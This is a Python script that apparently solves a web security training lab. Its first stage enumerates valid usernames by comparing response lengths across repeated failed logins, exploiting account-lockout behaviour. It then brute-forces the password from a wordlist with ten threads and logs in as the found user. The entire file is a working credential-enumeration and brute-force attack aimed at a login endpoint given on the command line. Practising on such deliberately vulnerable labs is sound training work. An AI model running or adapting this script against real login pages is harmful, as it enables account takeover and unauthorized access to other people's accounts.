import requests
from colorama import Fore, Style, init
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Event
import time


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        init()
        self.usernames_file = 'usernames.txt'
        self.passwords_file = 'passwords.txt'
        self.usernames = []
        self.passwords = []
        self.content_length = None
        self.valid_username = None
        self.valid_password = None
        self.lock = Lock()
        self.stop_event = Event()

    def open_usernames_and_passwords_files(self):
        with open(self.usernames_file) as file:
            for username in file.readlines():
                username = username.strip()
                self.usernames.append(username)
        with open(self.passwords_file) as file:
            for password in file.readlines():
                password = password.strip()
                self.passwords.append(password)

    def initial_request(self):
        data = {
            'username': 'hacker',
            'password': 'hacker'
        }
        response = self.session.post(self.lab_url + 'login', data=data)
        self.content_length = response.headers.get('Content-Length')

    def check_username(self, username):
        for i in range(4):
            if self.stop_event.is_set():
                return
            data = {
                'username': username,
                'password': 'hacker'
            }
            with self.lock:
                response = self.session.post(self.lab_url + 'login', data=data)
                if response.headers.get('Content-Length') != self.content_length:
                    print(Fore.GREEN + '[+] ' + Style.RESET_ALL + username)
                    self.valid_username = username
                    self.stop_event.set()
                    return
                else:
                    print(Fore.RED + '[-] ' + Style.RESET_ALL + username)

    def enumerate_usernames(self):
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.check_username, username) for username in self.usernames]
            for _ in as_completed(futures):
                if self.stop_event.is_set():
                    break

    def check_password(self, password):
        data = {
            'username': self.valid_username,
            'password': password
        }
        response = self.session.post(self.lab_url + 'login', data=data)
        if ('Invalid username or password.' not in response.text) and (
                'You have made too many incorrect login attempts.' not in response.text):
            print(Fore.GREEN + f'[+] {self.valid_username}:{password}' + Style.RESET_ALL)
            self.valid_password = password
            self.stop_event.set()
        else:
            print(Fore.RED + f'[-] {self.valid_username}:{password}' + Style.RESET_ALL)

    def enumerate_passwords(self):
        self.stop_event.clear()
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.check_password, password) for password in self.passwords]
            for _ in as_completed(futures):
                if self.stop_event.is_set():
                    break

    def sign_in(self):
        time.sleep(70)
        data = {
            'username': self.valid_username,
            'password': self.valid_password
        }
        self.session.post(self.lab_url + 'login', data=data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.open_usernames_and_passwords_files()
        self.initial_request()
        self.enumerate_usernames()
        self.enumerate_passwords()
        self.sign_in()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
